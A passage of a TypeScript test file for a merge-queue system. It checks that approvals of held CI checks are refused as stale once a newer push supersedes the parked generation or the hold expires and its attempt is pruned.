    repository.commit(CANDIDATE, { [CHECK_DEFINITION_PATH]: rewritten });
    // The next generation's candidate leaves the definition alone, so it runs at once.
    const NEXT = "4".repeat(40);
    repository.commit(NEXT, { [CHECK_DEFINITION_PATH]: definitionText() });
    const { configured } = heldEnvironment(repository);
    const first = { claimId: "clm_heldpin01", generation: 1, commit: OTHER };
    const second = { claimId: "clm_heldpin01", generation: 2, commit: "5".repeat(40) };
    const digest = await digestOf(rewritten);

    const seen = await runInDurableObject(stub, async (_instance, state) => {
      let now = NOW;
      let current = first;
      const log = EventLog.open(state.storage, repoId);
      const context: RepoContext = {
        repoId,
        storage: state.storage,
        log,
        clock: () => now,
        env: configured,
        wake: async () => true,
      };
      const composed = composeRepo(context);
      const attempts = new AttemptTable(state.storage, (attemptId) =>
        ports().train.holds(attemptId),
      );
      const checks = createChecks({
        repoId,
        attempts,
        log,
        main: async () => ({
          name: MAIN_REPO,
          namespace: "railhead",
          host: HOST,
          reader: repository,
        }),
        runs: { create: async () => {} },
        clock: () => now,
        ports: () => ports(),
      });
      const ports = (): RepoPorts => ({
        ...composed,
        claims: {
          ...composed.claims,
          pin: async () => ok(current),
          currentGeneration: () => current.generation,
          readyPin: () => ({ pin: current, episode: current.generation, decisions: [] }),
        },
        decisions: {
          ...composed.decisions,
          requirements: async () => ok([]),
          currentVersions: () => [],
        },
        mainWriter: { ...composed.mainWriter, head: async () => ok(MAIN) },
        merge: {
          compose: async (_main, pins) =>
            ok({ kind: "clean", candidate: pins[0]?.generation === 2 ? NEXT : CANDIDATE }),
          discard: async () => ok({ removed: 0 }),
        },
        checks,
        train,
      });
      const train = queueing(createTrain(context, ports), log);

      await train.enqueue(first, 1);
      const held = train.batches(1)[0];
      now = (held?.checkDeadline ?? NOW) + 1;
      await train.drive();
      const parked = train.entries(1)[0]?.state;
      const heldId = held?.attemptId ?? "";
      const holdsWhileParked = train.holds(heldId);

      // A new push supersedes the parked generation before anyone approves it.
      current = second;
      await train.enqueue(second, 2);
      const snapshot = () => ({
        attempt: attempts.get(heldId),
        batches: train.batches(8),
        entries: train.entries(8),
        events: log.replay(0, 100).events.map((event) => event.type),
      });
      const before = snapshot();
      const approved = await checks.approve({
        ...approval(digest),
        repoId,
        action: { kind: "check.approve", checkRunId: heldId, candidate: CANDIDATE, digest },
      });
      return {
        parked,
        holdsWhileParked,
        holdsAfter: train.holds(heldId),
        before,
        approved,
        after: snapshot(),
      };
    });

    expect(seen.parked).toBe("parked");
    expect(seen.holdsWhileParked).toBe(true);
    expect(seen.holdsAfter).toBe(false);
    expect(seen.approved).toEqual(
      fail("action_stale", "The train no longer holds that check; nothing changed."),
    );
    // No approval recorded, no event, and neither the train nor the attempt moved.
    expect(seen.after).toEqual(seen.before);
    expect(seen.after.attempt?.state.kind).toBe("held");
    expect(seen.after.attempt?.approval).toBeNull();
    expect(seen.after.events).not.toContain("check.approved");
    expect(seen.after.entries.map((entry) => [entry.pin.generation, entry.state])).toContainEqual([
      1,
      "parked",
    ]);
  });

  it("prunes an expired parked pin's attempt past the bound and refuses its approval", async () => {
    const { stub, repoId } = await initializedRepository();
    const repository = new FakeRepository();
    repository.commit(MAIN, { [CHECK_DEFINITION_PATH]: definitionText() });
    const rewritten = definitionText({ command: "true" });
    repository.commit(CANDIDATE, { [CHECK_DEFINITION_PATH]: rewritten });
    const { configured } = heldEnvironment(repository);
    const pin = { claimId: "clm_heldpin01", generation: 1, commit: OTHER };
    const digest = await digestOf(rewritten);

    const seen = await runInDurableObject(stub, async (_instance, state) => {
      let now = NOW;
      const log = EventLog.open(state.storage, repoId);
      const context: RepoContext = {
        repoId,
        storage: state.storage,
        log,
        clock: () => now,
        env: configured,
        wake: async () => true,
      };
      const composed = composeRepo(context);
      const attempts = new AttemptTable(state.storage, (attemptId) =>
        ports().train.holds(attemptId),
      );
      const checks = createChecks({
        repoId,
        attempts,
        log,
        main: async () => ({
          name: MAIN_REPO,
          namespace: "railhead",
          host: HOST,
          reader: repository,
        }),
        runs: { create: async () => {} },
        clock: () => now,
        ports: () => ports(),
      });
      const ports = (): RepoPorts => ({
        ...composed,
        claims: {
          ...composed.claims,
          pin: async () => ok(pin),
          currentGeneration: () => pin.generation,
          readyPin: () => ({ pin, episode: 1, decisions: [] }),
        },
        decisions: {
          ...composed.decisions,
          requirements: async () => ok([]),
          currentVersions: () => [],
        },
        mainWriter: { ...composed.mainWriter, head: async () => ok(MAIN) },
        merge: {
          compose: async () => ok({ kind: "clean", candidate: CANDIDATE }),
          discard: async () => ok({ removed: 0 }),
        },
        checks,
        train,
      });
      const train = queueing(createTrain(context, ports), log);

      await train.enqueue(pin, 1);
      const heldId = train.batches(1)[0]?.attemptId ?? "";
      now = (train.batches(1)[0]?.checkDeadline ?? NOW) + 1;
      await train.drive();
      const parked = train.entries(1)[0]?.state;
      // A full table keeps the attempt while the train may still run it.
      for (let i = 1; i <= MAX_STORED_ATTEMPTS; i += 1) {
        attempts.hold(identity(i), COMMAND, ["a"], null, now + i);
      }
      const keptWhileParked = attempts.get(heldId)?.state.kind;

      now += HELD_PARK_TTL_MS;
      await train.resume();
      const entry = train.entries(1)[0];
      attempts.hold(identity(MAX_STORED_ATTEMPTS + 1), COMMAND, ["a"], null, now);
      const approved = await checks.approve({
        ...approval(digest),
        repoId,
        action: { kind: "check.approve", checkRunId: heldId, candidate: CANDIDATE, digest },
      });
      return {
        parked,
        keptWhileParked,
        entry,
        afterExpiry: attempts.get(heldId),
        approved,
        heldId,
        events: log.replay(0, 100).events,
      };
    });

    expect(seen.parked).toBe("parked");
    expect(seen.keptWhileParked).toBe("held");
    expect(seen.entry).toMatchObject({ state: "dropped", reason: "held_expired" });
    // Expired, it was the oldest settled attempt, so the next insert past the bound removed it.
    expect(seen.afterExpiry).toBeNull();
    expect(seen.approved).toEqual(
      fail("action_stale", "That check is no longer held for that definition."),
    );
    // The expiry is in the log once, so the board ends the hold before the approval is refused.
    expect(seen.events.map((event) => event.type)).toEqual(["train.held", "train.held_expired"]);
    expect(seen.events[1]).toMatchObject({
      actor: { kind: "system", id: "sys_train" },
      data: { checkRunId: seen.heldId, candidate: CANDIDATE, reason: "timed_out" },
    });
  });
});
